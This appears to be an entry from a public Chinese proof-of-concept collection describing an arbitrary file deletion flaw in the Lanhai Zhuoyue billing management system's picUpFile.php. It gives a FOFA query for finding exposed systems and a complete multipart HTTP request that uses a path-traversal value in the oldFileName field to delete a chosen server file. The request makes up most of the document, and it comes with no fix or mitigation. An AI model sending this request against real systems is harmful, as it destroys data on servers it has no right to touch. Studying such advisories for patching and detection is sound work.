# 蓝海卓越 计费管理系统picUpLoad存在任意文件删除漏洞

# 一、漏洞简介
蓝海卓越 计费管理系统picUpLoad存在任意文件删除漏洞

# 二、影响版本
+ 蓝海卓越 计费管理系统

# 三、资产测绘
+ fofa`title=="蓝海卓越计费管理系统"`
+ 特征


# 四、漏洞复现
```plain
POST /inc/picUpFile.php?upFileFoler=&upFileID=&viewID= HTTP/1.1
Host: 
Content-Length: 1447494
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryehA9evlvumScbjSw
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 SE 2.X MetaSr 1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=lp91fvnja6f987dj7jmkjh5601
Connection: close

------WebKitFormBoundaryehA9evlvumScbjSw
Content-Disposition: form-data; name="oldFileName"

../../../../../usr/local/usr-gui/test.php
------WebKitFormBoundaryehA9evlvumScbjSw
Content-Disposition: form-data; name="file"; filename="c.jpg"
Content-Type: image/jpeg

PNG


```

删除前


删除后


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mcsdegx6gomcebd8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
